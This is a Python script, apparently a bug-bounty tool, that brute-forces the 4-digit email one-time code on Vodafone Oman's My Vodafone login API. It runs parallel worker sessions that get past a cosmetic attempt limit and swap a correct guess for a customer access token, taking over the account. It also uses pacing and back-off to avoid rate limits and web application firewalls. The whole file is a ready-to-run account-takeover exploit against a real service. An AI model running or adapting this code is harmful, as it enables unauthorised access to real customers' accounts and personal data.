#!/usr/bin/env python3
"""
Blind 4-digit EMAIL-OTP brute force — Vodafone Oman My Vodafone (MVA).
Pipeline design (mechanics verified live 2026-10-14):

  * One code is issued per EMAIL every ~60s (email-level resend cooldown,
    RESEND_LATER otherwise). Codes stay alive for ~5-15 min (otpExpiresIn
    299..899) and each belongs to the session that issued it.
  * The 3-attempt counter is COSMETIC: the server keeps evaluating guesses
    (OTP_MISMATCH) far past attemptsLeft=0 until the code expires
    (120 consecutive wrong guesses verified against one code).
  * Therefore N workers form a pipeline: each worker resends (gets its own
    code when the email cooldown lapsed), then hammers its static slice of
    0000-9999 against that code until it expires, then issues the next one.
    Steady state: N live codes, ~0.45 guesses/s each -> full 10^4 sweep in
    ~30-60 min, no re-guessing of values (static partition + persistent pos).
  * Success = response carries redirectUri (code=ac_...) -> exchange with
    the worker's own PKCE code_verifier -> full customer Bearer JWT (ATO).

Optional: if <statedir>/mailbox.json holds {"addr","token"} (mail.tm), a
background thread records every OTP email actually delivered (proof the
blindly-guessed code is the one the "victim" inbox received).

Usage: python3 bf.py <email> [workers=8] [statedir=/tmp/opencode/vfo]
Files: <statedir>/bf_log.jsonl  bf_SUCCESS.json  bf_stop
"""
import base64, hashlib, json, os, re, sys, threading, time, uuid
import urllib.error, urllib.parse, urllib.request

BASE = "https://vfo01.vodafone.om"
UA = ("Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Version/4.0 Chrome/120.0 Mobile Safari/537.36 h1.recon")

_lock = threading.Lock()
_stats = {"guesses": 0, "resends": 0, "errors": 0, "started": time.time()}
_err_window = []  # timestamps of recent errors (circuit breaker)
_breaker_until = 0

def note_error():
    global _breaker_until
    with _lock:
        now = time.time()
        _err_window.append(now)
        del _err_window[:max(0, len(_err_window) - 20)]
        # trip: >6 errors in last 120s -> everyone pauses 180s
        recent = [t for t in _err_window if now - t < 120]
        if len(recent) > 6 and now < _breaker_until + 170:
            _breaker_until = now + 180
            print("[bf] BREAKER: %d errors in 120s, pausing 180s" % len(recent), flush=True)

def breaker_wait(DIR, wid=None):
    global _breaker_until
    if time.time() < _breaker_until:
        d = dict(kind="error", msg="breaker pause")
        if wid is not None:
            d["w"] = wid
        _log(d, DIR)
        time.sleep(_breaker_until - time.time() + 1)

def _log(d, DIR):
    with _lock:
        d = dict(d, ts=time.strftime("%H:%M:%S", time.gmtime()) + "Z",
                 elapsed=int(time.time() - _stats["started"]))
        with open(os.path.join(DIR, "bf_log.jsonl"), "a") as f:
            f.write(json.dumps(d) + "\n")
        if d.get("kind") in ("FOUND", "error", "milestone", "expired"):
            print("[bf] " + json.dumps(d), flush=True)

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def vfo(path, body, ctype="application/json", timeout=40):
    h = {"User-Agent": UA, "Accept": "application/json", "Content-Type": ctype,
         "X-Application-ID": "MVA_ANDROID", "X-Request-ID": str(uuid.uuid4()),
         "X-Correlation-ID": str(uuid.uuid4()),
         "Zen-Application": "MVA", "Zen-OS": "android", "Zen-AppVersion": "5.2.2"}
    data = body.encode() if isinstance(body, str) else json.dumps(body).encode()
    req = urllib.request.Request(BASE + path, data=data, headers=h, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def mail_http(url, data=None, token=None, method=None, timeout=30):
    h = {"User-Agent": "h1.recon-bf/1.0"}
    body = None
    if data is not None:
        h["Content-Type"] = "application/json"
        body = json.dumps(data).encode()
    if token:
        h["Authorization"] = "Bearer " + token
    req = urllib.request.Request(url, data=body, headers=h,
                                 method=method or ("POST" if body else "GET"))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def start_session():
    """Fresh PKCE login session. Returns (tmp, sp, verifier)."""
    verifier = (b64u(uuid.uuid4().bytes) + b64u(uuid.uuid4().bytes))[:64]
    challenge = b64u(hashlib.sha256(verifier.encode()).digest())
    st, b = vfo("/auth/api/public/login/v1/start",
                {"clientId": "MVA", "responseType": "code", "scope": "openid",
                 "codeChallengeMethod": "S256", "codeChallenge": challenge,
                 "state": str(uuid.uuid4())})
    if st != 200:
        raise RuntimeError("login start %s: %s" % (st, b[:200]))
    j = json.loads(b)
    return j["temporaryAccessToken"], j["nextStep"]["emailOtpMethod"]["secretPayload"], verifier

def auth(tmp, sp, email, otp, resend):
    return vfo("/auth/api/public/login/v1/authenticate",
               {"authToken": {"emailOtpToken": {"secretPayload": sp, "email": email,
                                                "otp": otp, "resend": resend}},
                "temporaryAccessToken": tmp})

def ns_of(j):
    return (j.get("nextStep") or {}).get("emailOtpMethod") or {}

def exchange(code, verifier, DIR, email, worker, cstr):
    """authorization_code grant -> JWT + claims; write bf_SUCCESS.json."""
    st, b = vfo("/auth/api/public/access-token/v1",
                urllib.parse.urlencode({"client_id": "MVA", "scope": "openid",
                                        "code_verifier": verifier, "code": code,
                                        "grant_type": "authorization_code"}),
                ctype="application/x-www-form-urlencoded")
    j = json.loads(b)
    tok = j["access_token"]
    seg = tok.split(".")[1] + "=" * (-len(tok.split(".")[1]) % 4)
    claims = json.loads(base64.urlsafe_b64decode(seg))
    out = dict(ts=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
               email=email, worker=worker, guessed_code=cstr, auth_code=code,
               http=st, jwt=tok, claims=claims,
               total_guesses=_stats["guesses"], total_resends=_stats["resends"],
               elapsed_s=int(time.time() - _stats["started"]))
    with open(os.path.join(DIR, "bf_SUCCESS.json"), "w") as f:
        json.dump(out, f, indent=2)
    return tok

def get_code(wid, email, tmp, sp, DIR):
    """Resend-loop until a code is issued. Returns (tmp, sp, expiresIn) or None."""
    for _ in range(40):
        if os.path.exists(os.path.join(DIR, "bf_stop")) or \
           os.path.exists(os.path.join(DIR, "bf_SUCCESS.json")):
            return None
        st, b = auth(tmp, sp, email, None, True)
        try:
            j = json.loads(b)
            tmp = j["temporaryAccessToken"]
            ns = ns_of(j)
        except Exception:
            _log(dict(kind="error", w=wid, msg="bad resend response http=%s raw=%s"
                      % (st, b[:200])), DIR)
            note_error()
            time.sleep(15)
            return None
        if ns.get("otpStatus") == "RESEND_LATER":
            wait = min(int(ns.get("otpResendIn", 60)) + 2, 90)
            time.sleep(wait)
            continue
        _log(dict(kind="resend", w=wid, http=st, status=ns.get("otpStatus"),
                  att=ns.get("otpAttemptsLeft"),
                  expiresIn=ns.get("otpExpiresIn")), DIR)
        with _lock:
            _stats["resends"] += 1
        return tmp, sp if not ns.get("secretPayload") else ns["secretPayload"], \
               int(ns.get("otpExpiresIn", 900))
    _log(dict(kind="error", w=wid, msg="resend retries exhausted"), DIR)
    return None

def worker(wid, email, chunk, pos0, verifier, DIR):
    tmp = sp = None
    got = start_session()
    tmp, sp, verifier = got
    pos = pos0
    code_deadline = 0
    fail = 0
    while True:
        if os.path.exists(os.path.join(DIR, "bf_stop")) or \
           os.path.exists(os.path.join(DIR, "bf_SUCCESS.json")):
            return
        breaker_wait(DIR, wid)
        if os.path.exists(os.path.join(DIR, "bf_stop")) or \
           os.path.exists(os.path.join(DIR, "bf_SUCCESS.json")):
            return
        # --- no live code (or expired): get one ---
        if time.time() >= code_deadline:
            r = get_code(wid, email, tmp, sp, DIR)
            if r is None:
                try:
                    tmp, sp, verifier = start_session()
                except Exception as e:
                    _log(dict(kind="error", w=wid, msg="session restart: %s" % e), DIR)
                    time.sleep(15)
                    continue
                code_deadline = 0
                continue
            tmp, sp, exp = r
            code_deadline = time.time() + exp + 5
            fail = 0
        # --- hammer next value from this worker's static partition ---
        cstr = "%04d" % chunk[pos % len(chunk)]
        pos += 1
        time.sleep(1.0 + (time.time() * 1000 % 600) / 1000.0)
        try:
            st, b = auth(tmp, sp, email, cstr, False)
            j = json.loads(b)
        except Exception as e:
            fail += 1
            _log(dict(kind="error", w=wid, msg="guess exc %s: %s raw=%s"
                      % (type(e).__name__, str(e)[:100], b[:120])), DIR)
            with _lock:
                _stats["errors"] += 1
            note_error()
            if fail > 4:
                code_deadline = 0  # force re-issue via fresh session next loop
                try:
                    tmp, sp, verifier = start_session()
                except Exception:
                    time.sleep(15)
            else:
                time.sleep(30)  # back off hard on WAF-style HTML responses
            continue
        if "redirectUri" in j:
            m = re.search(r"code=([A-Za-z0-9_\-]+)", j["redirectUri"])
            with _lock:
                _stats["guesses"] += 1
            try:
                tok = exchange(m.group(1), verifier, DIR, email, wid, cstr)
                _log(dict(kind="FOUND", w=wid, code=cstr, jwt_prefix=tok[:40],
                          guesses=_stats["guesses"]), DIR)
            except Exception as e:
                _log(dict(kind="error", w=wid, msg="exchange failed: %s raw=%s"
                          % (e, b[:300])), DIR)
            return
        tmp2 = j.get("temporaryAccessToken")
        ns = ns_of(j)
        if tmp2:
            tmp = tmp2
        if ns.get("secretPayload"):
            sp = ns["secretPayload"]
        status = ns.get("otpStatus")
        with _lock:
            _stats["guesses"] += 1
        if status != "OTP_MISMATCH":
            _log(dict(kind="expired", w=wid, code=cstr, status=status,
                      att=ns.get("otpAttemptsLeft")), DIR)
            code_deadline = 0
        elif _stats["guesses"] % 100 == 0:
            _log(dict(kind="milestone", w=wid, last=cstr, guesses=_stats["guesses"]), DIR)

def inbox_audit(DIR):
    mb_path = os.path.join(DIR, "mailbox.json")
    if not os.path.exists(mb_path):
        return
    try:
        mb = json.load(open(mb_path))
    except Exception:
        return
    addr, mtoken = mb["addr"], mb["token"]
    try:
        st, msgs = mail_http("https://api.mail.tm/messages", token=mtoken)
        seen = {m["id"] for m in json.loads(msgs).get("hydra:member", [])}
    except Exception:
        return
    _log(dict(kind="milestone", msg="inbox audit started for " + addr), DIR)
    while True:
        if os.path.exists(os.path.join(DIR, "bf_success.json".upper())):
            time.sleep(10)
            if os.path.exists(os.path.join(DIR, "bf_SUCCESS.json")):
                break
        try:
            st, msgs = mail_http("https://api.mail.tm/messages", token=mtoken)
            for m in json.loads(msgs).get("hydra:member", []):
                if m["id"] in seen:
                    continue
                seen.add(m["id"])
                st2, full = mail_http("https://api.mail.tm/messages/" + m["id"],
                                      token=mtoken)
                data = json.loads(full)
                html = data.get("html") or ""
                if isinstance(html, list):
                    html = " ".join(p.get("content", "") if isinstance(p, dict)
                                    else str(p) for p in html)
                txt = data.get("text") or ""
                if isinstance(txt, list):
                    txt = " ".join(p.get("content", "") if isinstance(p, dict)
                                   else str(p) for p in txt)
                mt = re.search(r"otpCode=(\d{4})", html + " " + txt)
                _log(dict(kind="inbox", code=mt.group(1) if mt else None,
                          subject=(m.get("subject") or "")[:60],
                          received=(m.get("receivedAt") or "")[:19]), DIR)
        except Exception as e:
            _log(dict(kind="error", msg="inbox audit: %s" % e), DIR)
        time.sleep(7)

def main():
    if len(sys.argv) < 2:
        sys.exit("usage: bf.py <email> [workers=8] [statedir]")
    email = sys.argv[1]
    workers = int(sys.argv[2]) if len(sys.argv) > 2 else 2
    DIR = sys.argv[3] if len(sys.argv) > 3 else "/tmp/opencode/vfo"
    os.makedirs(DIR, exist_ok=True)
    for f in ("bf_SUCCESS.json", "bf_stop"):
        p = os.path.join(DIR, f)
        if os.path.exists(p):
            os.remove(p)
    _stats["started"] = time.time()
    _log(dict(kind="milestone",
              msg="START email=%s workers=%d pipeline mode" % (email, workers)), DIR)
    per = 10000 // workers
    pos0 = list(range(0, 10000, per))
    chunks = [list(range(a, a + per)) for a in pos0]
    chunks[-1] = list(range(pos0[-1], 10000))
    threading.Thread(target=inbox_audit, args=(DIR,), daemon=True).start()
    ts = [threading.Thread(target=worker,
                           args=(w, email, chunks[w], 0, None, DIR),
                           name="w%d" % w) for w in range(workers)]
    for x in ts:
        x.start()
    while any(x.is_alive() for x in ts):
        with _lock:
            g, r, e = _stats["guesses"], _stats["resends"], _stats["errors"]
        el = int(time.time() - _stats["started"])
        print("[bf] +%dm%02ds guesses=%d resends=%d errors=%d found=%s"
              % (el // 60, el % 60, g, r, e,
                 os.path.exists(os.path.join(DIR, "bf_SUCCESS.json"))), flush=True)
        time.sleep(60)
    print("[bf] finished. success=%s"
          % os.path.exists(os.path.join(DIR, "bf_SUCCESS.json")), flush=True)

if __name__ == "__main__":
    main()
